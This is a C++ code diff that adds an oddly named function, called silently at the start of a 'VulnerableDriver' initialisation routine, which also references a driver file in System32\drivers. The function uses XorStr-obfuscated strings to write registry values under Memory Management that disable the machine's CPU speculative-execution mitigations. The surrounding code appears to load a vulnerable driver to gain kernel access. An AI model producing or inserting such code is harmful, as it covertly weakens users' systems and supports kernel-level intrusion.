@@ -49,9 +49,58 @@ void system_no_output(std::string command)
     CloseHandle(ShExecInfo.hProcess);
 }
 
+bool chase1803magic() 
+{
+HKEY hKey{};
+LONG lReg{};
+
+DWORD disable = 0x3;
+
+lReg = RegCreateKeyEx(
+HKEY_LOCAL_MACHINE,
+XorStr(L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management").c_str(),
+0,
+NULL,
+REG_OPTION_NON_VOLATILE,
+KEY_ALL_ACCESS,
+NULL,
+&hKey,
+NULL
+);
+
+if (lReg != ERROR_SUCCESS) return false;
+
+lReg = RegSetValueEx(
+hKey,
+XorStr(L"FeatureSettingsOverride").c_str(),
+NULL,
+REG_DWORD,
+(LPBYTE)&disable,
+sizeof(disable)
+);
+
+if (lReg != ERROR_SUCCESS) return false;
+
+lReg = RegSetValueEx(
+hKey,
+XorStr(L"FeatureSettingsOverrideMask").c_str(),
+NULL,
+REG_DWORD,
+(LPBYTE)&disable,
+sizeof(disable)
+);
+
+if (lReg != ERROR_SUCCESS) return false;
+
+RegCloseKey(hKey);
+return true;
+}
 
 bool VulnerableDriver::Init()
 {
+
+chase1803magic();
+
     const std::string placement_path = XorStr("C:\\Windows\\System32\\drivers\\vmbusraid.sys").c_str();
 
     if (std::filesystem::exists(placement_path))
